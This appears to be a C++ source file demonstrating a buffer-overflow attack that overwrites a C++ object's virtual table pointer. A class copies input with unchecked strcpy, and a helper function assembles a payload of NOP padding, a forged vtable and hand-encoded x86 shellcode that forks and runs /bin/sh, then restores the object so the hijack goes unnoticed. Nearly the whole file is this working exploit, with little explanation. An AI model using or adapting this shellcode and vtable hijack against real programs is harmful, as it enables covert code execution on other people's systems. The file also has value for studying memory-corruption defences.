#include <stdio.h>
#include <string.h>
#include <malloc.h>

#define BUFFERSIZE 256

class BaseClass 
{
  private:
    char Buffer[BUFFERSIZE];

  public:
    void SetBuffer(char *String) 
    {
      strcpy(Buffer,String);
    }
    virtual void PrintBuffer() 
    {
      printf("%s\n",Buffer);
    }
};

class MyClass1:public BaseClass 
{
  public:
    void PrintBuffer() 
    {
      printf("MyClass1: ");
      BaseClass::PrintBuffer();
    }
};

class MyClass2:public BaseClass 
{
  public:
    void PrintBuffer() 
    {
      printf("MyClass2: ");
      BaseClass::PrintBuffer();
    }
};

char *BufferOverflow(unsigned long BufferAddress, int IAddress, int VPTROffset,
		unsigned long VTABLEAddress, char *NewBuffer, char LastByte)
{
  char *CBuf;
  unsigned long *LBuf;
  unsigned short *SBuf;
  
  char BinShSize,ShellCodeSize,StackCodeSize,NewBufferSize;
  
  unsigned long i, MethodAddressOffset, BinShAddressOffset, NullOffset,
  	BinShOffset, BinSh00Offset, ShellCodeOffset, StackCodeOffset, 
	NewBufferOffset, NewBuffer00Offset, LastByteOffset;
  
  char *BinSh="/bin/sh";

  CBuf = (char*) malloc(VPTROffset+4+1);
  LBuf = (unsigned long*) CBuf;

  BinShSize = (char) strlen(BinSh);
  ShellCodeSize = 0x62;
  StackCodeSize = 0x91+2-0x62;
  NewBufferSize = (char) strlen(NewBuffer);

  MethodAddressOffset = (IAddress-1) * 4;
  BinShAddressOffset = MethodAddressOffset + 4;
  NullOffset = MethodAddressOffset + 8;
  BinShOffset = MethodAddressOffset + 12;
  BinSh00Offset = BinShOffset + (unsigned long)BinShSize;
  ShellCodeOffset = BinSh00Offset + 1;
  StackCodeOffset = ShellCodeOffset + (unsigned long)ShellCodeSize;
  NewBufferOffset = StackCodeOffset + (unsigned long)StackCodeSize;
  NewBuffer00Offset = NewBufferOffset + (unsigned long)NewBufferSize;
  LastByteOffset = VPTROffset + 4;

  for (i=0; i<VPTROffset; i++) 
    CBuf[i]='\x90'; //NOPs

  for (i=0; i<IAddress; i++)
    LBuf[i] = BufferAddress+ShellCodeOffset;

  LBuf[IAddress] = BufferAddress+BinShOffset; //address of "/bin/sh"

  memcpy(&CBuf[BinShOffset], BinSh, BinShSize); //"/bin/sh" string

  //shellcode:
  i = ShellCodeOffset;
  
  CBuf[i++]='\x55';                         //pushl %ebp
  CBuf[i++]='\x89';CBuf[i++]='\xE5';        //movl %esp,%ebp
  CBuf[i++]='\x31';CBuf[i++]='\xC0';        //xorl %eax,%eax
  CBuf[i++]='\xB0';CBuf[i++]=StackCodeSize; //movb $StackCodeSize,%al
  CBuf[i++]='\x29';CBuf[i++]='\xC4';        //subl %eax,%esp
  CBuf[i++]='\x57';                         //pushl %edi
  CBuf[i++]='\x56';                         //pushl %esi
  CBuf[i++]='\x52';                         //pushl %edx
  CBuf[i++]='\x51';                         //pushl %ecx
  CBuf[i++]='\x53';                         //pushl %ebx
  CBuf[i++]='\x9C';                         //pushf
  CBuf[i++]='\xFC';                         //cld
  
  CBuf[i++]='\x90';CBuf[i++]='\x90';CBuf[i++]='\x90'; //code for the handling
  CBuf[i++]='\x90';CBuf[i++]='\x90';CBuf[i++]='\x90'; //of the "strange" this
  CBuf[i++]='\x90';CBuf[i++]='\x90';CBuf[i++]='\x90'; //pointer was removed                        
  CBuf[i++]='\x31';CBuf[i++]='\xC0';        //xorl %eax,%eax
  CBuf[i++]='\xBF';                       //movl $BufferAddress+$NullOffset,%edi
						
  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+NullOffset;
  i=i+4;

  CBuf[i++]='\xAB';                         //stosl %eax,%es:(%edi)
  CBuf[i++]='\xBF';                    //movl $BufferAddress+$BinSh00Offset,%edi

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+BinSh00Offset;
  i=i+4;

  CBuf[i++]='\xAA';                         //stosb %al,%es:(%edi)
  CBuf[i++]='\xB0';CBuf[i++]='\x02';        //movb $0x2,%al
  CBuf[i++]='\xCD';CBuf[i++]='\x80';        //int $0x80 (fork())
  CBuf[i++]='\x31';CBuf[i++]='\xD2';        //xorl %edx,%edx
  CBuf[i++]='\x39';CBuf[i++]='\xD0';        //cmpl %edx,%eax
  CBuf[i++]='\x75';CBuf[i++]='\x10';        //jnz +$0x10 (-> LFATHER)
  CBuf[i++]='\xB0';CBuf[i++]='\x0B';        //movb $0xB,%al
  CBuf[i++]='\xBB';                      //movl $BufferAddress+$BinShOffset,%ebx

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+BinShOffset;
  i=i+4;

  CBuf[i++]='\xB9';               //movl $BufferAddress+$BinShAddressOffset,%ecx

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+BinShAddressOffset;
  i=i+4;

  CBuf[i++]='\x31';CBuf[i++]='\xD2';        //xorl %edx,%edx
  CBuf[i++]='\xCD';CBuf[i++]='\x80';        //int $0x80 (execve())

  //LFATHER:
  CBuf[i++]='\x89';CBuf[i++]='\xD6';        //movl %edx,%esi
  CBuf[i++]='\x89';CBuf[i++]='\xD1';        //movl %edx,%ecx
  CBuf[i++]='\x89';CBuf[i++]='\xD3';        //movl %edx,%ebx
  CBuf[i++]='\xF7';CBuf[i++]='\xD3';        //notl %ebx
  CBuf[i++]='\x89';CBuf[i++]='\xD0';        //movl %edx,%eax
  CBuf[i++]='\xB0';CBuf[i++]='\x72';        //movb $0x72,%al
  CBuf[i++]='\xCD';CBuf[i++]='\x80';        //int $0x80 (wait())
  CBuf[i++]='\x31';CBuf[i++]='\xC9';        //xorl %ecx,%ecx
  CBuf[i++]='\xB1';CBuf[i++]=StackCodeSize; //movb $StackCodeSize,%cl
  CBuf[i++]='\xBE';                  //movl $BufferAddress+$StackCodeOffset,%esi

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+StackCodeOffset;
  i=i+4;

  CBuf[i++]='\x89';CBuf[i++]='\xEF';        //movl %ebp,%edi
  CBuf[i++]='\x29';CBuf[i++]='\xCF';        //subl %ecx,%edi
  CBuf[i++]='\x89';CBuf[i++]='\xFA';        //movl %edi,%edx
  CBuf[i++]='\xF3';CBuf[i++]='\xA4';        //repz movsb %ds:(%esi),%es:(%edi)
  CBuf[i++]='\xFF';CBuf[i++]='\xE2';        //jmp *%edx (stackcode)

  //stackcode:
  CBuf[i++]='\xBE';                  //movl $BufferAddress+$NewBufferOffset,%esi

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+NewBufferOffset;
  i=i+4;

  CBuf[i++]='\xBF';                         //movl $BufferAddress,%edi

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress;
  i=i+4;

  CBuf[i++]='\x31';CBuf[i++]='\xC9';        //xorl %ecx,%ecx
  CBuf[i++]='\xB1';CBuf[i++]=NewBufferSize; //movb $NewBufferSize,%cl
  CBuf[i++]='\xF3';CBuf[i++]='\xA4';        //repz movsb %ds:(%esi),%es:(%edi)
  CBuf[i++]='\x30';CBuf[i++]='\xC0';        //xorb %al,%al
  CBuf[i++]='\xAA';                         //stosb %al,%es:(%edi)
  CBuf[i++]='\xBF';                       //movl $BufferAddress+$VPTROffset,%edi

  LBuf = (unsigned long*) &CBuf[i];
  *LBuf = BufferAddress+VPTROffset;
  i=i+4;

  CBuf[i++]='\xB8';                         //movl $VTABLEAddress,%eax

  LBuf = (unsigned long*) &CBuf[i]; 
  *LBuf = VTABLEAddress;
  i=i+4;

  CBuf[i++]='\x89';CBuf[i++]='\xC3';        //movl %eax,%ebx
  CBuf[i++]='\xAB';                         //stosl %eax,%es:(%edi)
  CBuf[i++]='\xB0';CBuf[i++]=LastByte;      //movb $LastByte,%al
  CBuf[i++]='\xAA';                         //stosb %al,%es:(%edi)
  CBuf[i++]='\x8B';CBuf[i++]='\x43';
  
  CBuf[i++]=(char)4*(IAddress-1);               //movl $4*Iaddress(%ebx),%eax
  
  CBuf[i++]='\x9D';                         //popf
  CBuf[i++]='\x5B';                         //popl %ebx
  CBuf[i++]='\x59';                         //popl %ecx
  CBuf[i++]='\x5A';                         //popl %edx
  CBuf[i++]='\x5E';                         //popl %esi
  CBuf[i++]='\x5F';                         //popl %edi
  CBuf[i++]='\x89';CBuf[i++]='\xEC';        //movl %ebp,%esp
  CBuf[i++]='\x5D';                         //popl %ebp
  CBuf[i++]='\xFF';CBuf[i++]='\xE0';        //jmp *%eax

  memcpy(&CBuf[NewBufferOffset], NewBuffer, (unsigned long)NewBufferSize);
					
  //insert the new string into the buffer
  LBuf = (unsigned long*) &CBuf[VPTROffset];
  *LBuf = BufferAddress; //address of our VTABLE
 
  CBuf[LastByteOffset] = 0; //last byte (for strcpy())

  return CBuf;
}

void main() 
{
  BaseClass *Object[2];

  unsigned long *VTABLEAddress;
  char *LByte;

  Object[0] = new MyClass1;
  Object[1] = new MyClass2;

  VTABLEAddress = (unsigned long*) ((char*) &(*Object[0])+256);
  LByte = (char *) (VTABLEAddress + 1);
    
  printf("Object[0] address = 0x%x\n", (unsigned long) &(*Object[0]));
  printf("VTable address = 0x%x\n", *VTABLEAddress);
  printf("VPTR following Byte = 0x%x\n", *LByte);
     
  Object[0]->SetBuffer(BufferOverflow((unsigned long) &(*Object[0]), 3, 
		BUFFERSIZE, *VTABLEAddress, "newstring", *LByte));

  Object[1]->SetBuffer("string2");
  Object[0]->PrintBuffer();
  Object[1]->PrintBuffer();
}
